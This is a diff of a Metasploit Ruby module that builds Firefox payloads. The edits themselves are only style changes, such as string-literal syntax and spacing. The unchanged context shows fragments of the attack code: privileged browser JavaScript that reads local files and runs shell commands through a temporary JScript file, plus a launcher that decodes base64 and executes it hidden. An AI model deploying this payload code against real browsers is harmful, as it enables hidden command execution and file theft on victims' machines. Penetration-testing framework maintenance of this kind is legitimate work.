@@ -1,17 +1,17 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 require 'msf/core/exploit/jsobfu'
 require 'json'
 
 module Msf::Payload::Firefox
-
   # automatically obfuscate every Firefox payload
   include Msf::Exploit::JSObfu
 
   # Javascript source code of setTimeout(fn, delay)
   # @return [String] javascript source code that exposes the setTimeout(fn, delay) method
   def set_timeout_source
-    %Q|
+    %|
       var setTimeout = function(cb, delay) {
         var timer = Components.classes["@mozilla.org/timer;1"].createInstance(Components.interfaces.nsITimer);
         timer.initWithCallback({notify:cb}, delay, Components.interfaces.nsITimer.TYPE_ONE_SHOT);
@@ -30,7 +30,7 @@ module Msf::Payload::Firefox
   #
   # @return [String] javascript source code that exposes the readUntilToken(cb) function
   def read_until_token_source
-    %Q|
+    %|
       var readUntilToken = function(cb) {
         Components.utils.import("resource://gre/modules/NetUtil.jsm");
 
@@ -56,7 +56,7 @@ module Msf::Payload::Firefox
   #
   # @return [String] javascript source code that exposes the readFile(path) method
   def read_file_source
-    %Q|
+    %|
       var readFile = function(path) {
         try {
           var file = Components.classes["@mozilla.org/file/local;1"]
@@ -100,7 +100,7 @@ module Msf::Payload::Firefox
   #
   # @return [String] javascript source code that exposes the runCmd(str) method.
   def run_cmd_source
-    %Q|
+    %|
       #{read_file_source}
       #{set_timeout_source}
 
@@ -108,7 +108,7 @@ module Msf::Payload::Firefox
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
       var windows = (ua.indexOf("Windows")>-1);
       var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
-      var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
+      var jscript = (#{JSON.unparse(src: jscript_launcher)}).src;
       var runCmd = function(cmd, cb) {
         cb = cb \|\| (function(){});
 
@@ -155,7 +155,7 @@ module Msf::Payload::Firefox
           var jscriptFile = Components.classes["@mozilla.org/file/directory_service;1"]
             .getService(Components.interfaces.nsIProperties)
             .get("TmpD", Components.interfaces.nsIFile);
-          jscriptFile.append('#{Rex::Text.rand_text_alphanumeric(8+rand(12))}.js');
+          jscriptFile.append('#{Rex::Text.rand_text_alphanumeric(8 + rand(12))}.js');
           var stream = Components.classes["@mozilla.org/network/safe-file-output-stream;1"]
             .createInstance(Components.interfaces.nsIFileOutputStream);
           stream.init(jscriptFile, 0x04 \| 0x08 \| 0x20, 0666, 0);
@@ -167,7 +167,7 @@ module Msf::Payload::Firefox
           }
         }
 
-        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8+rand(12))}";
+        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8 + rand(12))}";
 
         var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
           .getService(Components.interfaces.nsIProperties)
@@ -216,7 +216,7 @@ module Msf::Payload::Firefox
   # @return [String] JScript that reads its command-line argument, decodes
   # base64 and runs it as a shell command.
   def jscript_launcher
-    %Q|
+    %|
       var b64 = WScript.arguments(0);
       var dom = new ActiveXObject("MSXML2.DOMDocument.3.0");
       var el  = dom.createElement("root");
@@ -228,5 +228,4 @@ module Msf::Payload::Firefox
       (new ActiveXObject("WScript.Shell")).Run(cmd, 0, true);
     |
   end
-
 end
